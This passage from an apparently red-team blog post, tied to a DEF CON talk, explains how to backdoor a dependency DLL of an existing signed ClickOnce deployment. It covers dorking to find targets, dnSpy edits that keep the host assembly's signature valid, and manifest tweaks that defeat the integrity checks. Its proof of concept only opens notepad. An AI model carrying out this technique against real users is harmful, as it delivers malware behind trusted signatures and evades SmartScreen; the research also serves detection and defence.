AssemblyKeyFile(@\"..\\..\\tools\\devdiv\\FinalPublicKey.snk\")]\n  [assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]\n  [assembly: DefaultDllImportSearchPaths(DllImportSearchPath.System32 | DllImportSearchPath.AssemblyDirectory)]\n```\n\n```image\nAlt: Embedded Application Manifest\nDescription: The image displays an XML manifest file for a ClickOnce application. It includes various sections such as the XML version, encoding, and application identity. Key elements include security settings, compatibility information, and application details. The manifest specifies requested privileges and execution levels, indicating that the application is designed to run with minimal user interaction and detail the supported operating systems.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n  <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n    <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\n    <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n      <security>\n        <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n          <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n        </requestedPrivileges>\n      </security>\n    </trustInfo>\n    <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n      <application>\n        <!-- This ID below indicates app support for Windows 7 -->\n        <supportedOS Id=\"{3313b89a-5d96-4fbd-8e2d-a2440225f93a}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{42af2e83-533b-4441-ba9c-d694da4a6e38}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n      </application>\n    </compatibility>\n  </assembly>\n```\n\n```image\nAlt: ClickOnce Deployment Manifest, Executable, and Application Manifest\nDescription: The image displays a file directory structure related to a ClickOnce deployment. It shows the folder 'Clickonce_Demo1' containing three files: 'Clickonce_Demo1.application', 'Click_Demo1.exe.deploy', and 'Click_Demo1.exe.manifest'. Each file has a date modified timestamp of '4/19/2022 9:35 PM' and indicates their respective types—Application Manifest, DEPLOY File, and MANIFEST File—with sizes of 6 KB and 7 KB. This structure is relevant for understanding ClickOnce deployment manifests as discussed in the accompanying text.\nTranscription: |\n  Name                            Date modified        Type                    Size\n  Clickonce_Demo1.application     4/19/2022 9:35 PM    APPLICATION Manifest    6 KB\n  Clickonce_Demo1.exe.deploy      4/19/2022 9:35 PM    DEPLOY File             6 KB\n  Clickonce_Demo1.exe.manifest    4/19/2022 9:35 PM    MANIFEST File           7 KB\n```\n\nClickOnce applications can be deployed to a client by visiting the *.application deployment manifest using a browser. The download and execution process of a standard ClickOnce deployment requires the end user to be using a Microsoft Edge or Internet Explorer browser. An alternative to requiring the target user to access your deployment manifest from either Edge or Internet Explorer would be to leverage APPREF-MS. When creating an *.appref-ms file, UTF-16 LE encoding is required. An appref-ms file would be used if the end user is using something like Chrome or Firefox to access the application.\n\n> **NOTE:** A simple user-agent check can be done prior to reaching the landing page to determine whether the incoming request should be pointed towards the standard deployment manifest or an appref-ms file.\n\nThe host assembly, specified in the manifest, will spawn as a child process of ‘dfsvc.exe’, which handles the ClickOnce deployment functionality that is imported from ‘System.Deployment.dll’. The contents of the ClickOnce application manifest will specify what dependencies and other resources will be delivered during the deployment process. The contents of the deployment will ultimately be saved to:\n\n> `C:\\Users\\%USERNAME%\\AppData\\Local\\Apps\\2.0\\<randomstring>`\n\nOnce a user has accepted to run the application, the deployment manifest will look to the ClickOnce application manifest for all the files that need to be downloaded.\n\n```image\nAlt: ClickOnce Deployment Manifest Example\nDescription: The image displays a snippet of XML code that represents a ClickOnce deployment manifest. It includes details about the compatible frameworks and a dependency assembly. Specifically, it highlights the codebase path to the manifest file of a ClickOnce application, along with its version, public key token, and processor architecture. This information is crucial for understanding how the ClickOnce deployment mechanism operates.\nTranscription: |\n  <compatibleFrameworks xmlns=\"urn:schemas-microsoft-com:clickonce.v2\">\n      <framework targetVersion=\"4.7.2\" profile=\"full\" supportedRuntime=\"4.0.30319\" />\n  </compatibleFrameworks>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" codebase=\"Application Files\\ClickOnce_1.1.07.13875\\ClickOnce.exe.manifest\" size=\"55369\">\n          <assemblyIdentity name=\"ClickOnce.exe\" version=\"1.1.07.13875\" publicKeyToken=\"0000000000000000\" language=\"neutral\" processorArchitecture=\"msil\" type=\"win32\" />\n      </dependentAssembly>\n  </dependency>\n```\n\nThere will be different pieces of information located throughout the manifest that look very similar to .NET application manifests. This will contain all of the files and dependencies the deployment will need to execute properly.\n\n```image\nAlt: ClickOnce Application Manifest Example\nDescription: The image displays a code snippet that appears to be an XML representation of a ClickOnce deployment manifest. It includes various `dependency` and `file` elements, each detailing the properties of the assemblies and files required for the application. The `dependentAssembly` sections specify the `assemblyIdentity` with attributes such as `dependencyType`, `codebase`, `version`, and `size`, indicating the dependencies needed for the application to function correctly. The `file` elements list specific files included in the deployment, along with their names and sizes.\nTranscription: |\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"GRBase.dll\" size=\"1283072\">\n          <assemblyIdentity name=\"GRBase\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"GRPrincipal.dll\" size=\"146432\">\n          <assemblyIdentity name=\"GRPrincipal\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"Infra.dll\" size=\"68096\">\n          <assemblyIdentity name=\"Infra\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"WebserviceClients.dll\" size=\"508416\">\n          <assemblyIdentity name=\"WebserviceClients\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <file name=\"CCe.zip\" size=\"84771\" />\n  <file name=\"ClickOnce.exe.config\" size=\"31570\" />\n  <file name=\"NFe.zip\" size=\"1646533\" />\n  <file name=\"Resources/clickOnce.ico\" size=\"113799\" />\n  <file name=\"Resources/globe.ico\" size=\"67646\" />\n  <file name=\"Resources/logo.png\" size=\"67646\" />\n```\n\nThe dfsvc process will make a series of HTTP requests for the downloads and save in the %LocalAppData% location mentioned above.\n\n```image\nAlt: HTTP Requests While Downloading a ClickOnce Application\nDescription: The image displays a series of HTTP GET requests as seen in a network monitoring tool or terminal. Each line represents a request for various files associated with a ClickOnce application deployment, including manifests, images, and DLLs. The requests indicate the retrieval of components necessary for the installation and execution of a .NET application using ClickOnce technology.\nTranscription: |\n  \"GET /clickonce.html HTTP/1.1\"\n  \"GET /ClickOnce.application HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/ClickOnce.exe.manifest HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/ClickOnce.ico.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/globe.ico.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/CCe.zip.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/logo.png.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/NFe.zip.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/ClickOnce.exe.config.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Infra.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/GRBase.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/GRPrincipal.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/WebserviceClients.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/GR.Presentation.Infra.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Facilities.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/ClickOnce.exe.deploy HTTP/1.1\"\n```\n\nIn some scenarios users may want to interact with ClickOnce applications but are not using Microsoft Edge or Internet Explorer. An appref-ms file can be created that will act similar to an LNK or shortcut file that will contain the URL of the deployment manifest and some other pieces of information.\n\n```image\nAlt: APPREF-MS Example\nDescription: The image displays a URL pointing to a ClickOnce deployment manifest file, formatted as a web link. The URL includes the address 'https://192.168.1.1/files/ClickOnce.application' followed by a fragment '#ClickOnce', and additional parameters indicating 'Culture=neutral' and 'processorArchitecture=msil'. This format is relevant for initiating ClickOnce applications, as it specifies the deployment details necessary for executing a .NET application.\nTranscription: https://192.168.1.1/files/ClickOnce.application##ClickOnce, Culture=neutral, processorArchitecture=msil\n```\n\nDuring the process before all the downloading happens, the System.Deployment DLL will be utilized to run through various checks and ensure the ClickOnce application can properly execute. One important check to note is the .NET application and ClickOnce deployment identities that are configured in the assembly and the deployment manifests.\n\n```image\nAlt: System.Deployment.dll Logic to Parse Manifests\nDescription: The image is a code snippet that appears to be written in C#, showcasing how to handle assembly manifests in the context of ClickOnce deployment. Key components include variable declarations for dependent assemblies and manifest elements, along with a conditional check to validate the identity of the assembly manifest against the dependent assembly's identity. The code highlights the process of managing application and deployment manifests during the ClickOnce application execution.\nTranscription: |\n  DependentAssembly dependentAssembly = (DependentAssembly)dependencyDownloadCookie.ManifestElement;\n  AssemblyManifest deployManifest = dependencyDownloadCookie.DeployManifest;\n  AssemblyManifest appManifest = dependencyDownloadCookie.AppManifest;\n  AssemblyManifest assemblyManifest = new AssemblyManifest(e.FileLocalPath);\n  \n  if (!assemblyManifest.Identity.Matches(dependentAssembly.Identity, true))\n  {\n      throw new InvalidDeploymentException(ExceptionTypes.RefDefValidation, string.Format(CultureInfo.CurrentUICulture, \n      {\n          fileName\n      }));\n  }\n```\n\nCommonly, when crafting an initial access payload and using ClickOnce, you’d go through the process of writing it up in an IDE like Visual Studio and building the ClickOnce application. So what does standard ClickOnce deployment execution look like, using a newly created .NET application?\n\n<iframe allowfullscreen=\"\" class=\"em n fe dz bh\" frameborder=\"0\" height=\"480\" scrolling=\"no\" src=\"https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2FLU0Ec8Z9JpU%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DLU0Ec8Z9JpU&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2FLU0Ec8Z9JpU%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube\" title=\"Defcon30 ClickOnce - DEMO1\" width=\"854\"></iframe>\n\n---\n\n## Current ClickOnce Weaponization Pressure Points\n\nAs seen in the first demo, we experience a few issues. For instance, Microsoft SmartScreen was triggered. This is because the assembly that ultimately executed with our arbitrary code was compiled recently and had never been seen by SmartScreen before. The reputation for Microsoft SmartScreen can be based on a number of factors such as the hash of the host assembly or the certificate used to sign the assembly.\n\nAchieving arbitrary code execution within the context of an application seen and otherwise trusted by Microsoft SmartScreen or EDR products can decrease likelihood of prevention. Solutions such as application control or whitelisting prevention can be noteworthy when considering how we want to conduct our code execution, especially during initial access attempts. An Extended Validation (EV) code signing certificate can be used to obtain immediate SmartScreen reputation, but the vetting process and price point increase the barrier to entry. When code-signing certificates are used, there are also additional attribution concerns.\n\nGenerally, a ClickOnce deployment can be tedious to make sure “all the stars align” for a successful deployment. Oftentimes people view ClickOnce as tedious to deploy successfully and having many configuration requirements. We hope the next couple sections outline the important fields within ClickOnce manifests to focus on, to assist in reproducing these techniques.\n\n---\n\n## Alleviation of ClickOnce Weaponization Pressure Points\n\nIf legitimate .NET applications make use of ClickOnce, and we can reliably sideload or hijack those .NET applications, why not just backdoor an existing deployment? An existing deployment that already has, lets say, a valid EV code signature and SmartScreen reputation?\n\n> **NOTE:** We will backdoor a dependency of a ClickOnce deployment, not the host assembly itself. We *maintain the valid signature* associated with that host assembly.\n\nIdentifying existing ClickOnce deployments can be as easy as leveraging a couple search engine dorking techniques (or using the ClickonceHunter tool which will be covered later). Several tools can be used throughout this process (e.g. dnSpy, reshacker, mage, sigcheck, etc).\n\n```image\nAlt: Download of ClickOnce Application Discovered from Google\nDescription: The image displays a screenshot showing a file directory structure on the left, indicating files related to a ClickOnce application deployment, including 'publish.htm' and 'setup.exe'. On the right, there is a Google search result for the term 'inurl:publish.htm', showing various links that include prerequisites for running a specific .NET application. The search results display descriptions about required software components, highlighting the potential for identifying ClickOnce deployments online.\nTranscription: |\n  Folder Structure:\n  source\n  └── repos\n      └── Clickonce_Demo1\n          └── clickonce_published\n              ├── Application Files\n              ├── Clickonce_Demo1.application\n              ├── publish.htm\n              └── setup.exe\n  \n  Date modified:\n  - publish.htm: 7/10/2022 12:31 AM\n  - Clickonce_Demo1.application: 7/10/2022 12:31 AM\n  - setup.exe: 7/10/2022 12:31 AM\n  \n  Google Search Results for \"inurl:publish.htm 'The following prerequisites'\":\n  Page 14 of about 1,860 results (0.47 seconds)\n  1. http://[...]/publish\n     Publisher: The following prerequisites are required: Windows Installer 3.1 .NET Framework 3.5 SP1; SQL Server Compact 3.5; if these components are already ...\n  \n  2. http://[...]/publish\n     Publisher: The following prerequisites are required: Microsoft .NET Framework 4.5.2 (x86 and x64); Windows Installer 4.5; if these components are already installed, you can launch ...\n  \n  3. https://[...]\n     Publisher: The following prerequisites are required: Microsoft .NET Framework 4.5.2 (x86 and x64); if these components are already installed, you can launch ...\n```\n\nWe will want to identify sideloading opportunities for dependencies of the target .NET assembly that the ClickOnce deployment will execute. Any way for us to hijack the flow of execution shortly after the application entry point is what we are looking for. Oftentimes this process consists of using dnSpy to decompile the target .NET assembly to understand the execution flow enough to identify a sideload opportunity.\n\nOnce an ideal DLL to backdoor has been identified, use dnSpy to add your code to the target DLL. At this point, the ClickOnce manifests of the deployment you’ve chosen will need to be tweaked to pass their integrity checks. If you cannot identify an ideal sideload opportunity in the existing codepath(s), techniques such as AppDomainManager injection or .NET deserialization abuse can be helpful here.\n\nThe image below is a quick example of what sideloading an existing, signed ClickOnce deployment would look like. First, we find a ClickOnce deployment published online, download it, and verify the assembly that the deployment executes meets our needs (valid code signature, SmartScreen reputation, etc):\n\n```image\nAlt: Example of Signed ClickOnce Application\nDescription: The image displays the properties window of a ClickOnce application file named 'Defcon30_Demo.exe'. On the left, the 'Security' tab shows the signature list, while the right side contains details about the digital certificate used to sign the executable. The certificate information indicates its purpose, which includes ensuring that the software originates from the software publisher and protecting it from alteration after publication. It details the issuer as 'DigiCert SHA2 Assured ID Code Signing CA' and specifies the validity dates of the certificate, from May 17, 2021, to May 21, 2023. This information is relevant for understanding the security measures and integrity of the ClickOnce application.\nTranscription: |\n  Defcon30_Demo.exe Properties\n  7/17/2022 8:04 PM\n  Application\n  238 KB\n  \n  Security\n  General\n  Compatibility\n  Details\n  Previous Versions\n  Digital Signatures\n  \n  Certificate\n  - Signature list\n    Name of signer: [Redacted]\n  \n  Certificate Information\n  This certificate is intended for the following purpose(s):\n  - Ensures software came from software publisher\n  - Protects software from alteration after publication\n  \n  * Refer to the certification authority's statement for details.\n  \n  Issued to: [Redacted]\n  Issued by: DigiCert SHA2 Assured ID Code Signing CA\n  Valid from 5/17/2021 to 5/21/2023\n```\n\nNext we take a look at the references within the signed .NET assembly we want to sideload. A few of the DLLs the assembly uses are not strongly named, which can be helpful in certain situations:\n\n```image\nAlt: Dependencies of Target Assembly\nDescription: The image displays a screenshot of dnSpy, a tool used for decompiling .NET assemblies. In this view, the 'Assembly Explorer' panel is shown, highlighting the references of a .NET assembly. Several assembly references are listed, with particular attention drawn to those that have a null 'PublicKeyToken'. This indicates the assemblies may not be strongly named, which is relevant for possible sideloading opportunities in the context of backdooring ClickOnce applications.\nTranscription: |\n  1. // Facilities, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  2. // GR.Presentation.Infra, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  3. // GRBase, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  4. // GRPrincipal, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  5. // mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\n  6. // System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  7. // System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  8. // System.Deployment, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  9. // System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  10. // WebserviceClients, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n```\n\nUsing DnSpy to begin at the target .NET assembly’s entry point, we follow the code to the first method call of “SetDpiAwareness()”. This function exists within on the the Dlls previously identified:\n\n```image\nAlt: Following the Code Path\nDescription: The image displays a snippet of C# code from a .NET application, specifically showing the 'Main' method of a public static class named 'Program'. The code includes calls to the 'SetDpiAwareness()' method from the 'DpiSettings' class, as well as references to application initialization and user login dialog handling. The highlighted section indicates the location in the code where the 'SetDpiAwareness()' method is invoked, demonstrating the flow of execution for the ClickOnce deployment process discussed in the context.\nTranscription: |\n  public static class Program\n  {\n      // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00002050\n      [STAThread]\n      public static void Main()\n      {\n          try\n          {\n              DpiSettings.SetDpiAwareness();\n              Application.EnableVisualStyles();\n              Application.SetCompatibleTextRenderingDefault(false);\n              Context.Inicializa();\n              Program.verificaProxy();\n              Program.verificaVersao();\n              FLogin flogin = new FLogin();\n              flogin.ShowDialog();\n              if (flogin.DialogResult != DialogResult.OK)\n              {\n                  Application.Exit();\n              }\n              else\n              {\n                  // Additional code can go here\n              }\n          }\n      }\n  }\n```\n\nWe observe the code within this method and verify it exists within a DLL dependency (not the host .NET assembly):\n\n```image\nAlt: Identified Location to Place Additional Code\nDescription: The image displays a snippet of C# code from a .NET application, specifically a method named 'SetDpiAwareness'. The code is structured in a way that checks the Windows version and sets process DPI awareness accordingly. It includes multiple conditional statements that handle different Windows versions such as Windows 7, 8, 10, and 2008. This code is relevant in the context of the ClickOnce deployment discussion, illustrating a potential point for injecting additional code into a .NET application.\nTranscription: |\n  // Token: 0x060000AD RID: 173 RVA: 0x00005274 File Offset: 0x00003474\n  public static void SetDpiAwareness()\n  {\n      try\n      {\n          string name = WindowsVersion.Name;\n          if (!(name == \"Windows7\") && !(name == \"Windows2008\"))\n          {\n              if (!(name == \"Windows8\") && !(name == \"Windows81\"))\n              {\n                  if (name == \"Windows10\")\n                  {\n                      DpiSettings.SetProcessDpiAwarenessContext(16);\n                  }\n                  else\n                  {\n                      DpiSettings.SetProcessDpiAwareness(0);\n                  }\n              }\n              else\n              {\n                  DpiSettings.SetProcessDPIAware();\n              }\n          }\n      }\n  }\n```\n\nThe additional code we’d like to sideload the ClickOnce deployment with can be added here. For proof-of-concept sake, we will just spawn notepad and prompt with a MessageBox:\n\n```image\nAlt: Adding Code to Target Dependency\nDescription: The image displays a snippet of C# code demonstrating a method called `SetDpiAwareness()`. This method includes functionality to execute arbitrary code by starting 'notepad.exe', displaying a message box indicating 'Malicious Code Executed', and includes logic related to the Windows version. The code is annotated with comments and structured to suggest it is part of a proof-of-concept for backdooring a ClickOnce deployment.\nTranscription: |\n  public static void SetDpiAwareness()\n  {\n      try\n      {\n          Thread.Sleep(1500);\n          Process.Start(\"notepad.exe\");\n          Thread.Sleep(1500);\n          System.Windows.Forms.MessageBox.Show(\"Signed and trusted process executing our arbitrary code.\", \"Malicious Code Executed\", MessageBoxButtons.OK, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);\n          Application.Exit;\n      }\n      string name = WindowsVersion.Name;\n      if (!(name == \"Windows7\") && !(name == \"Windows2008\"))\n      {\n          if (!(name == \"Windows8\") && !(name == \"Windows81\"))\n          {\n              if (name == \"Windows10\")\n              {\n                  DpiSettings.SetProcessDpiAwarenessContext(16);\n              }\n          }\n          else\n          {\n              DpiSettings.SetProcessDpiAwareness(0);\n          }\n      }\n  }\n```\n\nAt this point, dnSpy can add your changes to intermediary language (IL) and you will have your backdoored dependency of the target ClickOnce application. Now is a good time to test and make sure the additional code you’ve added properly executes when running the host .NET assembly.\n\n> **NOTE:** We previously thought a prerequisite was targeting only non-strongly named DLLs. We discovered this is not a requirement because modifying a DLL does not modify the PublickeyToken value of the DLL. The PublickeyToken value is in reference to the hash of the assembly’s embedded manifest rather than the code itself. If the manifest is not modified, the PublickeyToken value remains the same and will still be loaded successfully.\n\nNow that we have our sideload of a signed .NET application that is part of an existing ClickOnce deployment, our last step to have a functioning deployment is to tweak the two ClickOnce manifests such that the integrity checks that occur during deployment do not fail. Here’s a few tips that will hopefully speed the process up:\n\n- **publicKeyToken** — this value is required, but can be nulled out by replacing the value with 16 zeros\n- **\\<hash\\>** — this block is optional and can be removed or recalculated (EX: *openssl -dgst -binary -sha1 Program.exe.manifest |openssl enc -base64)*\n- **\\<publisherIdentity\\>** — included if the manifests have been signed, but is optional and can be removed\n\nA noteworthy mention regarding modification of an existing ClickOnce manifest is that if the manifest was signed with a valid certificate, then making these modifications will break that integrity. The difference to the end user is minimal and many legitimate ClickOnce deployments do not sign their manifests at all. We still have control of the prompt observed by the target user, such as “Name” and “From”. A signed vs unsigned look similar to the image below:\n\n```image\nAlt: Difference Between Signed and Unsigned Deployment Manifest\nDescription: The image shows two side-by-side screenshots of security warning dialogs related to the ClickOnce deployment process. On the left, the dialog for an unsigned ClickOnce manifest indicates that the publisher cannot be verified, prompting the user to decide whether to run the application. On the right, the dialog for a signed ClickOnce manifest confirms the installation and shows the publisher's name, providing a more reassuring message for the user. The left dialog uses 'Run' and 'Don't Run' buttons, while the right uses 'Install' and 'Don't Install' buttons, highlighting the difference in user trust based on the signing status of the application.\nTranscription: |\n  Application Run - Security Warning\n  Publisher cannot be verified.\n  Are you sure you want to run this application?\n  \n  Name:\n  From (Hover over the string below to see the full domain):\n  Publisher: Unknown Publisher\n  \n  [Run] [Don't Run]\n  \n  While applications from the Internet can be useful, they can potentially harm your computer. If you do not trust the source, do not run this software. More Information...\n  \n  Unsigned ClickOnce manifest\n  \n  ---\n  \n  Application Install - Security Warning\n  Do you want to install this application?\n  \n  Name:\n  From (Hover over the string below to see the full domain):\n  Publisher:\n  \n  [Install] [Don't Install]\n  \n  While applications from the Internet can be useful, they can potentially harm your computer. If you do not trust the source, do not install this software. More Information...\n  \n  Signed ClickOnce manifest\n```\n\nSo the question posed is this: *Do we really need a code signing certificate to effectively weaponize ClickOnce deployments?*\n\n<iframe allowfullscreen=\"\" class=\"em n fe dz bh\" frameborder=\"0\" height=\"480\" scrolling=\"no\" src=\"https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2FP_xUIOg32BY%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DP_xUIOg32BY&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2FP_xUIOg32BY%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube\" title=\"Defcon30 ClickOnce - DEMO2\" width=\"854\"></iframe>\n\n---\n\n## Extending Past Existing ClickOnce Deployments\n\nThe number of published ClickOnce deployments easily identifiable through dorking is finite. It’s not a new technology, nor is it the most popular to deploy and update .NET applications. We foresaw this as a potential issue and sought to find a way to take *any* ideal .NET assembly, identify a sideload opportunity, and wrap it up as a new ClickOnce deployment. As it turns out, this was possible, with a few prerequisites.\n\n1. The \\<assemblyIdentity\\> field within the embedded application manifest must *not* exist, or the entire embedded application manifest must not exist (more on this in a bit)\n2. The UAC settings cannot be set to ‘requireAdministrator’ or ‘highestAvailable’\n\n.NET assemblies that meet these prerequisites can be weaponized as backdoored ClickOnce deployments relatively easily. The *System.Deployment* DLL has code that checks the assembly identity which is found in the embedded application manifest. This check cross-references the application manifest’s identity to ensure the identity values are the same. The image below shows what the embedded assembly manifest default identity will be if it is present.\n\n```image\nAlt: Example of Default “assemblyIdentity” Field\nDescription: The image displays an XML manifest file for a ClickOnce application. It includes the assembly identity information, specifying the version and name of the application. The manifest structure is outlined with various XML tags indicating security settings, requested privileges, and compatibility with different Windows versions. It shows an example of how to define application properties and UAC (User Account Control) settings within the manifest.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n  <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n    <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\n    <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n      <security>\n        <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n          <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n        </requestedPrivileges>\n      </security>\n    </trustInfo>\n    <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n      <application>\n        <!-- This ID below indicates app support for Windows 7 -->\n        <supportedOS Id=\"{351b389a-5d96-4fb4-8e2d-a2440225f93a}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a46a36b}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n      </application>\n    </compatibility>\n  </assembly>\n```\n\nAs you can see the identity contains two pieces of information, the version and the name. The figure below shows what is in the deployment manifest for the identity value. If you look at the difference there is a value of processorArchitecture.\n\n```image\nAlt: ClickOnce Deployment “assemblyIdentity”\nDescription: The image displays an XML snippet of a .NET assembly manifest. It highlights the `<assemblyIdentity>` element, which contains attributes such as `name`, `version`, `language`, and `processorArchitecture`. The `processorArchitecture` attribute is specifically set to \"amd64\", indicating the architecture type for the assembly. This information is crucial in the context of ClickOnce deployments, as it shows the required identity values in the application manifest.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <asmv1:assembly xsi:schemaLocation=\"urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd\" manifestVersion=\"1.0\" xmlns:asmv1=\"urn:schemas-microsoft-com:asm.v1\">\n      <asmv1:assemblyIdentity name=\"CasPol.exe\" version=\"1.0.0.0\" publicKeyToken=\"0000000000000000\" language=\"neutral\" processorArchitecture=\"amd64\"/>\n      <application />\n      <entryPoint>\n          <asmv1:assemblyIdentity name=\"MyApplication.app\" version=\"1.0.0.0\" language=\"neutral\" processorArchitecture=\"amd64\"/>\n          <commandLine file=\"CasPol.exe\" parameters=\"\" />\n      </entryPoint>\n  </asmv1:assembly>\n```\n\nThe ‘*processorArchitecture*’ value is a required value to be present for the assembly identity in the deployment manifest.\n\n```image\nAlt: MSDN Documentation Showing Required Values\nDescription: The image presents a table detailing the elements and attributes required for the 'assemblyIdentity' element in a ClickOnce deployment. It includes columns for 'Attribute' and 'Description,' listing attributes such as 'Name,' 'Version,' 'publicKeyToken,' and a highlighted entry for 'processorArchitecture,' which is marked as required. The table emphasizes that the 'assemblyIdentity' must contain no child elements and specifies the necessary attributes for proper identification of the application.\nTranscription: |\n  | Attribute             | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n  | --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | Name                  | Required. Identifies the name of the application. If Name contains special characters, such as single or double quotes, the application may fail to activate.                                                                                                                                                                                                                                                                                                                |\n  | Version               | Required. Specifies the version number of the application in the following format: major.minor.build.revision                                                                                                                                                                                                                                                                                                                                                                |\n  | publicKeyToken        | Optional. Specifies a 16-character hexadecimal string that represents the last 8 bytes of the SHA-1 hash value of the public key under which the application or assembly is signed. The public key that is used to sign the catalog must be 2048 bits or greater. Although signing an assembly is recommended but optional, this attribute is required. If an assembly is unsigned, you should copy a value from a self-signed assembly or use a \"dummy\" value of all zeros. |\n  | processorArchitecture | Required. Specifies the processor. The valid values are msil for all processors, x86 for 32-bit Windows, IA64 for 64-bit Windows, and Itanium for Intel 64-bit Itanium processors.                                                                                                                                                                                                                                                                                           |\n  | language              | Required. Identifies the two part language codes (for example, en-US) of the assembly. This element is in the asmv2 namespace. If unspecified, the default is neutral.                                                                                                                                                                                                                                                                                                       |\n```\n\nThese two values are checked against each other to validate assembly identities are the same. If the default identity value is present in the assembly’s embedded manifest it will fail because there is no ‘*processorArchitecture*’ value present. Therefore, this type of assembly is not possible to use as a ClickOnce application for our purposes. Modifying this value would require modifying the host assembly of our code execution, losing any benefit of a valid code-signature or reputations with Microsoft SmartScreen.\n\n```image\nAlt: System.Deployment dll Checking Identities\nDescription: The image shows a code snippet from a .NET application, specifically a method named 'Matches' which checks if the identity attributes of a reference identity match exactly with the current object's 